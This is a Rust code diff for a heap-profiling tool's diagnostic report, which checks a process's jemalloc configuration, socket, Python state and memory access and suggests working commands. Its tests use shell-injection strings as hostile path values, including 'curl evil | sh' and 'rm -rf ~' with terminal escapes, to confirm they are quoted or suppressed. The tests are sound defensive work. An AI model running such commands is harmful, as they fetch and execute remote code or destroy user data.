@@ -35,6 +35,8 @@ use crate::snoop::{self, Process};
 /// be read: a profile that takes longer is said not to be readable, though
 /// `--snoop` itself would wait longer for it.
 const SNOOP_WITHIN: Duration = Duration::from_secs(30);
+/// How long the responder's socket is given to take a connection.
+const ANSWER_WITHIN: Duration = Duration::from_secs(10);
 /// How long the whole of the looking may take.
 pub const WITHIN: Duration = Duration::from_secs(90);
 /// The most read of a process's environment, and of its name.
@@ -60,9 +62,10 @@ pub struct Conf {
 }
 
 impl Conf {
-    /// The settings in a process's environment, if it has any. The last
+    /// The settings in a process's environment, if it has any. The first
     /// variable whose name ends in `MALLOC_CONF` and that sets `prof` is
-    /// taken, else the last there is.
+    /// taken, else the first there is: of one name set twice, `getenv` finds
+    /// the first.
     pub fn in_environ(environ: &[u8]) -> Option<Conf> {
         let mut found: Option<Conf> = None;
         for kv in environ.split(|b| *b == 0) {
@@ -74,8 +77,10 @@ impl Conf {
                 continue;
             }
             let conf = Conf::parse(name, value);
-            if conf.prof.is_some() || found.as_ref().is_none_or(|f| f.prof.is_none()) {
-                found = Some(conf);
+            match &found {
+                None => found = Some(conf),
+                Some(f) if f.prof.is_none() && conf.prof.is_some() => found = Some(conf),
+                Some(_) => {}
             }
         }
         found
@@ -91,7 +96,9 @@ impl Conf {
             let value = value.trim();
             match key.trim() {
                 "prof" => conf.prof = value.parse().ok(),
-                "prof_prefix" => conf.prefix = Some(value.to_string()),
+                "prof_prefix" if value.len() <= ask::MAX_PATH_BYTES => {
+                    conf.prefix = Some(value.to_string())
+                }
                 "lg_prof_interval" => {
                     conf.lg_interval = value
                         .parse::<i64>()
@@ -152,6 +159,13 @@ pub struct Facts {
     /// Which of the hooks' libraries it maps.
     pub hooks: Option<String>,
     pub snoop: std::result::Result<Snooped, String>,
+    /// This user may not read the process's memory, so much of the above
+    /// could not be looked at: not seen is then not the same as not there.
+    pub memory_denied: bool,
+    /// The environment the process was started with could not be read.
+    pub environ_unread: bool,
+    /// The directory the caller named with --ask-dir.
+    pub ask_dir: Option<PathBuf>,
 }
 
 /// [`check`], given up on after `limit`: the process's memory, its
@@ -185,10 +199,10 @@ pub fn check(process: &Process, dir: Option<&Path>) -> Result<Facts> {
             .find(|m| m.label().is_some_and(|name| name.contains(what)))
             .map(|m| m.path.clone())
     };
-    let conf = process
-        .read_capped("environ", MAX_ENVIRON_BYTES)
-        .ok()
-        .and_then(|environ| Conf::in_environ(&environ));
+    let environ = process.read_capped("environ", MAX_ENVIRON_BYTES).ok();
+    let conf = environ.as_deref().and_then(Conf::in_environ);
+    let memory_denied = std::fs::File::open(process.file("mem"))
+        .is_err_and(|e| e.kind() == std::io::ErrorKind::PermissionDenied);
     let files = match conf.as_ref().and_then(|c| c.prefix.clone()) {
         None => Files::NoPrefix,
         Some(prefix) => files_under(&root, prefix, own_pid),
@@ -210,14 +224,41 @@ pub fn check(process: &Process, dir: Option<&Path>) -> Result<Facts> {
         jemalloc: mapped("jemalloc"),
         conf,
         files,
-        responder: ask::in_the_first_of(&sockets_in, |dir| responder::answers(process, &root, dir))
-            .map_err(|e| first_line(&format!("{e:#}"))),
-        python: python::would(process)
+        responder: answers_within(process, sockets_in, ANSWER_WITHIN),
+        python: python::would(process, &root, dir.unwrap_or(Path::new(ask::DEFAULT_DIR)))
             .unwrap_or_else(|e| python::Would::Cannot(first_line(&format!("{e:#}")))),
         code_map: pycode::token_of(&maps).map(str::to_string),
         hooks: mapped("libsysting_heap_"),
         snoop,
+        memory_denied,
+        environ_unread: environ.is_none(),
+        ask_dir: dir.map(Path::to_path_buf),
     })
+}
+
+/// Whether a responder answers in one of `dirs`, given up on after `limit`
+/// by itself. Connecting waits while the socket's queue is full, as that of a
+/// process that is stopped or hung comes to be, and the rest of the report
+/// is what is wanted of just such a process.
+fn answers_within(
+    process: &Process,
+    dirs: Vec<PathBuf>,
+    limit: Duration,
+) -> std::result::Result<PathBuf, String> {
+    let looked = process.try_clone().map(|process| {
+        snoop::run_within(limit, move || {
+            let root = process.root()?;
+            ask::in_the_first_of(&dirs, |dir| responder::answers(&process, &root, dir))
+        })
+    });
+    match looked {
+        Ok(Ok(found)) => found.map_err(|e| first_line(&format!("{e:#}"))),
+        Ok(Err(_)) => Err(format!(
+            "its socket took no connection within {} s: the process may be stopped or hung",
+            limit.as_secs()
+        )),
+        Err(e) => Err(first_line(&format!("{e:#}"))),
+    }
 }
 
 /// A reason, as one line: what it says first. Of a process without a
@@ -307,7 +348,7 @@ fn files_under(root: &Root, prefix: String, own_pid: u32) -> Files {
 /// to end the command it is in and begin another, nor to write to the
 /// terminal.
 fn word(path: &str) -> Option<String> {
-    let printable = |c: char| !c.is_control() && c != char::REPLACEMENT_CHARACTER;
+    let printable = |c: char| !ask::hidden(c) && c != char::REPLACEMENT_CHARACTER;
     if !path.starts_with('/') || !path.chars().all(printable) {
         return None;
     }
@@ -318,11 +359,15 @@ fn word(path: &str) -> Option<String> {
     })
 }
 
+/// Why a command that would hold such a path is not printed.
+const UNPRINTABLE: &str = "a folder it names is not an absolute path, or has characters that \
+                           are not safe to print in a command";
+
 /// A way of looking at the heap that will work.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub struct Way {
-    /// The command, whole; None when a path in it cannot be printed in one.
-    pub command: Option<String>,
+    /// The command, whole; or why none is printed.
+    pub command: std::result::Result<String, &'static str>,
     /// What it gives.
     pub gives: String,
 }
@@ -356,6 +401,18 @@ impl Facts {
         self.snoop.is_ok() || self.responder.is_ok()
     }
 
+    /// The variable jemalloc's settings were read from, or would be.
+    fn conf_name(&self) -> String {
+        self.conf
+            .as_ref()
+            .map_or_else(|| "MALLOC_CONF".to_string(), |c| shown(&c.variable))
+    }
+
+    /// Whether jemalloc writes snapshot files at an interval.
+    fn writes_by_itself(&self) -> bool {
+        self.conf.as_ref().is_some_and(|c| c.lg_interval.is_some())
+    }
+
     /// Whether the environment asks for profiling.
     fn asks_for_profiling(&self) -> Option<bool> {
         self.conf.as_ref().and_then(|c| c.prof)
@@ -370,39 +427,60 @@ impl Facts {
 
     /// What was found, a line for each thing looked for.
     fn found(&self) -> Vec<(&'static str, String)> {
+        let conf = self.conf_name();
         let mut lines = Vec::new();
         lines.push((
             "jemalloc",
             match &self.jemalloc {
-                Some(file) => format!("yes: {}", shown(file)),
-                None if self.snoop.is_ok() => "yes: in the program itself".into(),
-                None => "not seen: no file of that name is mapped".into(),
+                Some(file) => format!("loaded: {}", shown(file)),
+                None if self.snoop.is_ok() => "linked into the program".into(),
+                None => "not found: no mapped file has that name".into(),
             },
         ));
         lines.push((
-            "profiling",
+            "heap profiling",
             match (self.profiles(), self.asks_for_profiling()) {
                 (true, _) => "on".into(),
-                (false, Some(true)) => "not seen, though its environment asks for it \
-                                        (prof:true): jemalloc is not loaded or is built \
-                                        without it, or nothing has been sampled yet"
-                    .into(),
-                (false, Some(false)) => "off: its environment says prof:false".into(),
-                (false, None) => "not seen: no prof:true in its environment, and no \
-                                  profile in its memory"
-                    .into(),
+                (false, Some(false)) => format!("off: {conf} has prof:false"),
+                // Not looked at is not the same as not there.
+                (false, Some(true)) if self.memory_denied => format!(
+                    "asked for ({conf} has prof:true), but not confirmed: this user may not \
+                     read the process's memory"
+                ),
+                (false, None) if self.memory_denied || self.environ_unread => {
+                    "unknown: this user may not read the process's memory or environment".into()
+                }
+                (false, Some(true)) => format!(
+                    "not seen, although {conf} has prof:true: jemalloc is not loaded, was \
+                     built without profiling, or has sampled nothing yet"
+                ),
+                (false, None) => {
+                    format!("not seen: no prof:true in {conf}, and no profile in memory")
+                }
+            },
+        ));
+        lines.push((
+            "socket",
+            match &self.responder {
+                Ok(socket) => format!("answering at {}", shown(&socket.display().to_string())),
+                Err(why) => format!("none: {}", shown(why)),
             },
         ));
         lines.push((
             "snapshot files",
             match &self.files {
-                Files::NoPrefix => "none: no prof_prefix in its environment".into(),
+                // jemalloc's own prefix is "jeprof", in the working directory.
+                Files::NoPrefix if self.writes_by_itself() => format!(
+                    "not checked: {conf} sets lg_prof_interval and no prof_prefix, so they are \
+                     jeprof.* in the working directory"
+                ),
+                Files::NoPrefix => format!("none: no prof_prefix in {conf}"),
                 Files::Relative(prefix) => format!(
-                    "not looked for: {} is relative to its working directory",
+                    "not checked: prof_prefix {} is relative to the working directory",
                     shown(prefix)
                 ),
                 Files::Unread { prefix, why } => {
-                    format!("not looked for under {}: {}", shown(prefix), shown(why))
+                    format!("not checked under {}: {}", shown(prefix), shown(why))
                 }
                 Files::Under {
                     prefix,
@@ -410,12 +488,11 @@ impl Facts {
                     newest,
                 } => {
                     let when = match self.conf.as_ref().and_then(|c| c.lg_interval) {
-                        Some(lg) => format!("one every {} it allocates", bytes(lg)),
-                        None => "when the service itself asks jemalloc for one".into(),
+                        Some(lg) => format!("one per {} allocated", bytes(lg)),
+                        None => "written only when the service asks jemalloc".into(),
                     };
-                    let newest = newest.map_or(String::new(), |n| {
-                        format!(", the newest written {} ago", ago(n))
-                    });
+                    let newest =
+                        newest.map_or(String::new(), |n| format!(", newest {} old", ago(n)));
                     format!("{count} under {}{newest}; {when}", shown(prefix))
                 }
             },
@@ -428,56 +505,48 @@ impl Facts {
             },
         ));
         lines.push((
-            "responder",
-            match &self.responder {
-                Ok(socket) => format!("answers at {}", shown(&socket.display().to_string())),
-                Err(why) => format!("no: {}", shown(why)),
-            },
-        ));
-        lines.push((
             "Python",
             match &self.python {
-                python::Would::NotPython => "no: it maps no Python".into(),
-                python::Would::Cannot(why) => format!("cannot be asked: {}", shown(why)),
+                python::Would::NotPython => "not a Python process".into(),
+                python::Would::Cannot(why) => {
+                    format!("--ask python cannot be used: {}", shown(why))
+                }
                 python::Would::Answer(version) => format!(
-                    "CPython {version}: it can be asked, and answers when its main thread \
-                     comes back to Python"
+                    "CPython {version}: --ask python can be used, and is answered once the \
+                     main thread returns to Python code"
                 ),
             },
         ));
         lines.push((
-            "Python functions",
+            "Python stacks",
             match (&self.code_map, &self.python) {
                 (Some(_), _) => format!(
-                    "in its stacks; the code map is in {}",
+                    "on; code map in {}",
                     self.code_map_dir().map_or_else(
-                        || "the folder of its prof_prefix, which its environment does not \
-                            say"
-                        .to_string(),
+                        || format!("the working directory (no absolute prof_prefix in {conf})"),
                         |dir| shown(&dir)
                     )
                 ),
-                (None, python::Would::NotPython) => "none: it is no Python".into(),
-                (None, _) => "not in its stacks: install(backtrace=\"python\") was not \
-                              called"
-                    .into(),
+                (None, python::Would::NotPython) => "not a Python process".into(),
+                (None, _) => "off: install(backtrace=\"python\") was not called".into(),
             },
         ));
         lines.push((
-            "its memory",
+            "memory read",
             match &self.snoop {
-                Ok(read) if read.clean => format!("read: {} stack(s)", read.stacks),
+                Ok(read) if read.clean => format!("works: {} stack(s) read", read.stacks),
                 Ok(read) => format!(
-                    "read: {} stack(s), some skipped as the heap moved",
+                    "works: {} stack(s) read, some skipped because the heap was changing",
                     read.stacks
                 ),
-                Err(why) => format!("not read: {}", shown(why)),
+                Err(why) => format!("failed: {}", shown(why)),
             },
         ));
         lines
     }
 
-    /// The ways that will work, the one to try first first.
+    /// The ways that will work, best first: the socket, then files, then
+    /// what needs nothing in the service.
     pub fn ways(&self) -> Vec<Way> {
         let pid = self.pid;
         let mut ways = Vec::new();
@@ -490,31 +559,11 @@ impl Facts {
             (Some(_), Some(dir)) => (format!(" --perf-map-dir {dir}"), ""),
             (Some(_), None) => (
                 String::new(),
-                "; its Python functions stay unnamed without --perf-map-dir and the folder \
-                 its code map is in, which is not known here",
+                " Add --perf-map-dir with the folder that holds the service's pycode-*.map \
+                 file, or Python functions stay unnamed.",
             ),
             (None, _) => (String::new(), ""),
         };
-        if let Files::Under {
-            prefix,
-            count: 1..,
-            newest,
-        } = &self.files
-        {
-            ways.push(Way {
-                command: word(prefix).map(|prefix| {
-                    format!("systing-heap -o heap.duckdb --pid {pid} --latest-only {prefix}")
-                }),
-                gives: format!(
-                    "jemalloc's own dump, the latest of each process that writes under that \
-                     prefix; this one's is from {}",
-                    newest.map_or("a time not known".to_string(), |n| format!(
-                        "{} ago",
-                        ago(n)
-                    ))
-                ),
-            });
-        }
         if let Ok(socket) = &self.responder {
             // In /tmp the folder need not be said.
             let dir = match socket.parent() {
@@ -524,31 +573,68 @@ impl Facts {
                 _ => Some(String::new()),
             };
             ways.push(Way {
-                command: dir.map(|dir| {
-                    format!("systing-heap -o heap.duckdb --pid {pid} --ask responder{dir}")
-                }),
-                gives: "jemalloc's own dump, as of now (experimental)".into(),
+                command: dir
+                    .map(|dir| format!("systing-heap -o heap.duckdb --pid {pid} --ask{dir}"))
+                    .ok_or(UNPRINTABLE),
+                gives: "A complete dump, taken now, over the socket.".into(),
+            });
+        }
+        if let Files::Under {
+            prefix,
+            count: 1..,
+            newest,
+        } = &self.files
+        {
+            ways.push(Way {
+                command: match prefix.ends_with('/') {
+                    // It names the folder itself, which is taken for one.
+                    true => Err(
+                        "systing-heap takes a prof_prefix that ends in a slash for a \
+                                 folder, and reads no folder with --pid",
+                    ),
+                    false => word(prefix)
+                        .map(|prefix| {
+                            format!(
+                                "systing-heap -o heap.duckdb --pid {pid} --latest-only {prefix}"
+                            )
+                        })
+                        .ok_or(UNPRINTABLE),
+                },
+                gives: format!(
+                    "The newest snapshot file of every process that writes under that prefix. \
+                     This process's is {}.",
+                    newest.map_or("of unknown age".to_string(), |n| format!("{} old", ago(n)))
+                ),
             });
         }
         if let (python::Would::Answer(_), true) = (&self.python, self.profiles()) {
+            // The directory that was looked at is the one that is named.
+            let dir = match &self.ask_dir {
+                Some(dir) => word(&dir.display().to_string()).map(|d| format!(" --ask-dir {d}")),
+                None => Some(String::new()),
+            };
             ways.push(Way {
-                command: Some(format!(
-                    "systing-heap -o heap.duckdb --pid {pid} --ask python{code_map}"
-                )),
+                command: dir
+                    .map(|dir| {
+                        format!(
+                            "systing-heap -o heap.duckdb --pid {pid} --ask python{dir}{code_map}"
+                        )
+                    })
+                    .ok_or(UNPRINTABLE),
                 gives: format!(
-                    "jemalloc's own dump, as of now, if its main thread comes back to Python \
-                     within 30 s; it writes to the process's memory (experimental){unnamed}"
+                    "A complete dump, taken now. It writes to the process's memory, and needs \
+                     the main thread to return to Python code within 30 s.{unnamed}"
                 ),
             });
         }
         if self.snoop.is_ok() {
             ways.push(Way {
-                command: Some(format!(
+                command: Ok(format!(
                     "systing-heap -o heap.duckdb --pid {pid} --snoop{code_map}"
                 )),
                 gives: format!(
-                    "the profile as it is in memory now; stacks can be missing \
-                     (experimental){unnamed}"
+                    "The profile read from memory, now. Nothing is done to the process, but \
+                     stacks can be missing.{unnamed}"
                 ),
             });
         }
@@ -558,51 +644,58 @@ impl Facts {
     /// The commands that will work and can be printed, in the order of
     /// [`Facts::ways`].
     pub fn will_work(&self) -> Vec<String> {
-        self.ways().into_iter().filter_map(|w| w.command).collect()
+        self.ways()
+            .into_iter()
+            .filter_map(|w| w.command.ok())
+            .collect()
     }
 
-    /// What the service would have to be given for more than it has: each
-    /// with the recipe that says how.
+    /// What a change to the service's setup would add: each with the section
+    /// of the guide that says how.
     pub fn would_give_more(&self) -> Vec<(String, &'static str)> {
         let mut more = Vec::new();
-        if !self.profiles() {
+        if !self.profiles() && self.memory_denied {
             more.push((
-                match self.asks_for_profiling() {
-                    Some(true) => "a profile to look at: its environment asks for one, and \
-                                   jemalloc has to be loaded into it, and be one built with \
-                                   profiling"
-                        .to_string(),
-                    _ => "anything at all: it has to be started with jemalloc and \
-                          prof:true, which cannot be turned on in a process that runs"
-                        .to_string(),
-                },
-                "Files at an interval",
+                "Nothing needs changing yet: run this again as root, or as the service's user \
+                 where kernel.yama.ptrace_scope allows it. This user may not read the \
+                 process's memory, so most of the above could not be checked."
+                    .to_string(),
+                "Prerequisites",
             ));
             return more;
         }
-        let writes_by_itself = self.conf.as_ref().is_some_and(|c| c.lg_interval.is_some());
-        if !writes_by_itself {
+        if !self.profiles() {
             more.push((
-                "snapshots over time, to see how the heap grew: prof_prefix and \
-                 lg_prof_interval in its MALLOC_CONF"
-                    .to_string(),
-                "Files at an interval",
+                match self.asks_for_profiling() {
+                    Some(true) => "Load a jemalloc that was built with profiling. MALLOC_CONF \
+                                   already asks for it."
+                        .to_string(),
+                    _ => "Start the service on jemalloc with prof:true in MALLOC_CONF. It \
+                          cannot be turned on in a running process."
+                        .to_string(),
+                },
+                "Step 1: turn on heap profiling",
             ));
+            return more;
         }
         if self.responder.is_err() {
             more.push((
-                "a dump of this moment, whatever its threads are doing: the responder \
-                 (experimental)"
-                    .to_string(),
-                "Asked, by environment",
+                "Add the socket, for a complete dump at any moment.".to_string(),
+                "Start here: collect over the socket",
             ));
         }
         if self.code_map.is_none() && self.python != python::Would::NotPython {
             more.push((
-                "Python functions in its stacks, with file and line: \
-                 install(backtrace=\"python\")"
+                "Call install(backtrace=\"python\"), to see Python functions with file and line."
                     .to_string(),
-                "Python functions in the stacks",
+                "Python services",
+            ));
+        }
+        if !self.writes_by_itself() {
+            more.push((
+                "Set prof_prefix and lg_prof_interval, for a history of how the heap grew."
+                    .to_string(),
+                "Snapshot files at an interval",
             ));
         }
         more
@@ -614,37 +707,30 @@ impl Facts {
         let mut out = String::new();
         let itself = match self.own_pid == self.pid {
             true => String::new(),
-            false => format!(", pid {} to itself", self.own_pid),
+            false => format!("; pid {} in its own pid namespace", self.own_pid),
         };
         writeln!(out, "pid {} ({}{itself})\n", self.pid, shown(&self.name)).unwrap();
         for (what, said) in self.found() {
-            writeln!(out, "  {what:.<20} {said}").unwrap();
+            writeln!(out, "  {:.<18} {said}", format!("{what} ")).unwrap();
         }
         let ways = self.ways();
         match ways.is_empty() {
-            true => out.push_str("\nNothing here can look at its heap as it runs now.\n"),
-            false => out.push_str("\nWhat will work, the one to try first first:\n\n"),
+            true => out.push_str("\nNo command can read this process's heap as it runs now.\n"),
+            false => out.push_str("\nCommands that will work, best first:\n\n"),
         }
         for way in &ways {
             match &way.command {
-                Some(command) => writeln!(out, "  {command}").unwrap(),
-                None => out.push_str(
-                    "  (no command is printed for this one: a folder it would name has \
-                     characters that no command is printed with)\n",
-                ),
+                Ok(command) => writeln!(out, "  {command}").unwrap(),
+                Err(why) => writeln!(out, "  (command not printed: {why})").unwrap(),
             }
             writeln!(out, "      {}", way.gives).unwrap();
         }
         let more = self.would_give_more();
         if !more.is_empty() {
-            writeln!(
-                out,
-                "\nWhat the service would have to be given for more (the recipes are in {GUIDE}):\n"
-            )
-            .unwrap();
+            writeln!(out, "\nTo get more ({GUIDE}):\n").unwrap();
         }
-        for (what, recipe) in more {
-            writeln!(out, "  {what}\n      recipe: {recipe}").unwrap();
+        for (what, section) in more {
+            writeln!(out, "  {what}\n      See \"{section}\".").unwrap();
         }
         out
     }
@@ -718,6 +804,9 @@ mod tests {
                 stacks: 40,
                 clean: true,
             }),
+            memory_denied: false,
+            environ_unread: false,
+            ask_dir: None,
         }
     }
 
@@ -730,8 +819,8 @@ mod tests {
         assert_eq!(
             commands(&facts()),
             [
+                "systing-heap -o heap.duckdb --pid 4242 --ask --ask-dir /run/heap",
                 "systing-heap -o heap.duckdb --pid 4242 --latest-only /heap-dumps/jeprof",
-                "systing-heap -o heap.duckdb --pid 4242 --ask responder --ask-dir /run/heap",
                 "systing-heap -o heap.duckdb --pid 4242 --ask python --perf-map-dir /heap-dumps",
                 "systing-heap -o heap.duckdb --pid 4242 --snoop --perf-map-dir /heap-dumps",
             ]
@@ -739,13 +828,12 @@ mod tests {
         assert!(facts().would_give_more().is_empty());
         let report = facts().report();
         assert!(
-            report.starts_with("pid 4242 (python3.14, pid 7 to itself)\n"),
+            report.starts_with("pid 4242 (python3.14; pid 7 in its own pid namespace)\n"),
             "{report}"
         );
         assert!(
-            report.contains(
-                "12 under /heap-dumps/jeprof, the newest written 5 min ago; one every 1 GiB"
-            ),
+            report
+                .contains("12 under /heap-dumps/jeprof, newest 5 min old; one per 1 GiB allocated"),
             "{report}"
         );
     }
@@ -775,9 +863,9 @@ mod tests {
         assert_eq!(
             recipes,
             [
-                "Files at an interval",
-                "Asked, by environment",
-                "Python functions in the stacks"
+                "Start here: collect over the socket",
+                "Python services",
+                "Snapshot files at an interval"
             ]
         );
     }
@@ -788,8 +876,9 @@ mod tests {
             responder: Ok(PathBuf::from("/tmp/.systing-heap.7")),
             ..facts()
         };
-        assert!(commands(&here)
-            .contains(&"systing-heap -o heap.duckdb --pid 4242 --ask responder".to_string()));
+        assert!(
+            commands(&here).contains(&"systing-heap -o heap.duckdb --pid 4242 --ask".to_string())
+        );
     }
 
     #[test]
@@ -808,10 +897,12 @@ mod tests {
         assert!(commands(&off).is_empty());
         let more = off.would_give_more();
         assert_eq!(more.len(), 1);
-        assert!(more[0].0.contains("started with jemalloc and prof:true"));
+        assert!(more[0]
+            .0
+            .contains("Start the service on jemalloc with prof:true"));
         let report = off.report();
         assert!(
-            report.contains("Nothing here can look at its heap as it runs now."),
+            report.contains("No command can read this process's heap as it runs now."),
             "{report}"
         );
     }
@@ -838,11 +929,11 @@ mod tests {
         assert!(commands(&asked_for).is_empty());
         let report = asked_for.report();
         assert!(
-            report.contains("not seen, though its environment asks for it"),
+            report.contains("not seen, although MALLOC_CONF has prof:true"),
             "{report}"
         );
         assert!(
-            report.contains("Nothing here can look at its heap"),
+            report.contains("No command can read this process's heap"),
             "{report}"
         );
     }
@@ -906,8 +997,8 @@ mod tests {
         assert_eq!(
             commands(&hostile("/d/x; curl evil | sh #")),
             [
+                "systing-heap -o heap.duckdb --pid 4242 --ask --ask-dir '/run/a b'",
                 "systing-heap -o heap.duckdb --pid 4242 --latest-only '/d/x; curl evil | sh #'",
-                "systing-heap -o heap.duckdb --pid 4242 --ask responder --ask-dir '/run/a b'",
                 "systing-heap -o heap.duckdb --pid 4242 --ask python --perf-map-dir /d",
                 "systing-heap -o heap.duckdb --pid 4242 --snoop --perf-map-dir /d",
             ]
@@ -918,20 +1009,96 @@ mod tests {
         let worse = hostile("/d\x1b[2J/x\nrm -rf ~");
         assert!(!commands(&worse).iter().any(|c| c.contains("--latest-only")));
         assert_eq!(worse.ways().len(), commands(&worse).len() + 1);
+        // Nor with one that reorders the text around it.
+        assert_eq!(word("/x\u{202e}gnp.exe"), None);
         let report = worse.report();
         assert!(!report.contains('\x1b'), "{report:?}");
         assert!(!report.contains("\nrm -rf"), "{report:?}");
-        assert!(
-            report.contains("no command is printed for this one"),
-            "{report}"
-        );
+        assert!(report.contains("command not printed"), "{report}");
         // Python functions are not said to be named from a folder that is
         // not printed.
         assert!(commands(&worse)
             .iter()
             .all(|c| !c.contains("--perf-map-dir")));
         assert!(
-            report.contains("stay unnamed without --perf-map-dir"),
+            report.contains("or Python functions stay unnamed"),
+            "{report}"
+        );
+    }
+
+    #[test]
+    fn what_could_not_be_looked_at_is_not_said_to_be_missing() {
+        // The service's own user, where such processes are closed to one
+        // another: the environment can be read and the memory cannot.
+        let denied = Facts {
+            conf: Conf::in_environ(&environ(&["MALLOC_CONF=prof:true"])),
+            files: Files::NoPrefix,
+            responder: Err("there is no /tmp/.systing-heap.7".into()),
+            python: python::Would::Cannot("opening /proc/4242/mem: Permission denied".into()),
+            code_map: None,
+            snoop: Err("opening /proc/4242/mem: Permission denied".into()),
+            memory_denied: true,
+            ..facts()
+        };
+        let report = denied.report();
+        assert!(
+            report.contains("asked for (MALLOC_CONF has prof:true), but not confirmed"),
+            "{report}"
+        );
+        assert!(!report.contains("built without profiling"), "{report}");
+        assert!(!report.contains("Load a jemalloc"), "{report}");
+        assert!(report.contains("run this again as root"), "{report}");
+        assert!(report.contains("See \"Prerequisites\"."), "{report}");
+    }
+
+    #[test]
+    fn the_directory_that_was_looked_at_is_the_one_a_command_names() {
+        let named = Facts {
+            ask_dir: Some(PathBuf::from("/safe dir")),
+            responder: Ok(PathBuf::from("/safe dir/.systing-heap.7")),
+            ..facts()
+        };
+        let commands = commands(&named);
+        assert!(
+            commands.contains(
+                &"systing-heap -o heap.duckdb --pid 4242 --ask python --ask-dir '/safe dir' \
+                  --perf-map-dir /heap-dumps"
+                    .to_string()
+            ),
+            "{commands:#?}"
+        );
+    }
+
+    #[test]
+    fn a_prefix_the_tool_would_take_for_a_folder_gets_no_command() {
+        let slash = Facts {
+            files: Files::Under {
+                prefix: "/heap-dumps/".into(),
+                count: 2,
+                newest: Some(5),
+            },
+            ..facts()
+        };
+        assert!(!commands(&slash).iter().any(|c| c.contains("--latest-only")));
+        assert!(
+            slash.report().contains("ends in a slash"),
+            "{}",
+            slash.report()
+        );
+    }
+
+    #[test]
+    fn files_that_go_to_the_working_directory_are_not_said_to_be_none() {
+        let relative = Facts {
+            conf: Conf::in_environ(&environ(&[
+                "_RJEM_MALLOC_CONF=prof:true,lg_prof_interval:30",
+            ])),
+            files: Files::NoPrefix,
+            ..facts()
+        };
+        let report = relative.report();
+        assert!(
+            report.contains("_RJEM_MALLOC_CONF sets lg_prof_interval and no prof_prefix"),
             "{report}"
         );
     }
